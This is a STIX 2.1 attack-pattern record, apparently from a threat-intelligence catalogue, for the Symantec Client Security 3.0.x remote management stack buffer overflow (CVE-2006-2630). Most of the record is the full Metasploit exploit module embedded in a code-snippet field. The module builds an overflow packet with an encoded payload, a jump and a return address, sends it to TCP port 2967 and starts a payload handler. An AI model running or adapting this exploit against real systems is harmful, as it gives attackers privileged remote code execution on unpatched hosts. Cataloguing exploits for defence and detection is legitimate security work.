{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2668d85d-af8b-4d5b-b559-dac483eaee4b",
    "created": "2024-08-14T16:51:34.299077Z",
    "modified": "2024-08-14T16:51:34.299082Z",
    "name": "Symantec Remote Management Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Symantec Client Security 3.0.x. This module has only been tested against Symantec Client Security 3.0.2 build 10.0.2.2000. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/antivirus/symantec_rtvscan.rb",
            "external_id": "symantec_rtvscan.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2630"
        },
        {
            "source_name": "reference",
            "url": "http://research.eeye.com/html/advisories/published/AD20060612.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec Remote Management Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Symantec Client Security 3.0.x.\n        This module has only been tested against Symantec Client Security 3.0.2\n        build 10.0.2.2000.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2006-2630'],\n          ['OSVDB', '25846'],\n          ['BID', '18107'],\n          ['URL', 'http://research.eeye.com/html/advisories/published/AD20060612.html'],\n        ],\n      'Privileged'     => true,\n\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'SCS 3.0.2 build 10.0.2.2000', { 'Ret' => 0x69985624 } ], # Dec2TAR.dll\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2006-05-24'))\n\n    register_options(\n      [\n        Opt::RPORT(2967)\n      ])\n  end\n\n  def exploit\n    connect\n\n    header =  \"\\x01\\x10\\x0a\\x20\\x0a\\x00\\x00\\x00\"\n    header << \"\\x02\\x18\\x00\\x01\\x00\\x00\\x00\\x00\"\n    header << \"\\x00\\x24\\x00\\x14\\xb7\\xc9\\xd2\\xd9\"\n    header << \"\\x3e\\x33\\xef\\x34\\x25\\x1f\\x43\\x00\"\n\n    crufta =  rand_text_alphanumeric(512)\n    cruftb =  rand_text_alphanumeric(514)\n    cruftc =  payload.encoded + rand_text_alphanumeric(513 - payload.encoded.length)\n    cruftd =  rand_text_alphanumeric(495)\n\n    cruftd[479, 2] = \"\\xeb\\x06\"\n    cruftd[483, 4] = [target.ret].pack('V')\n    cruftd[487, 5] = [0xe8, -1000].pack('CV')\n\n    cruftd << rand_text_alphanumeric(21)\n    crufte =  rand_text_alphanumeric(6) + \"\\x19\\x00\\x00\\x00\"\n    crufte << rand_text_alphanumeric(504) + \"\\x00\\x00\"\n\n    overflow =  [ crufta.length ].pack('v') + crufta\n    overflow << [ cruftb.length ].pack('v') + cruftb\n    overflow << [ cruftc.length ].pack('v') + cruftc\n    overflow << [ cruftd.length ].pack('v') + cruftd\n    overflow << [ crufte.length ].pack('v') + crufte\n\n    sploit = header + overflow\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-05-24",
    "x_mitre_platforms": [
        "win'"
    ]
}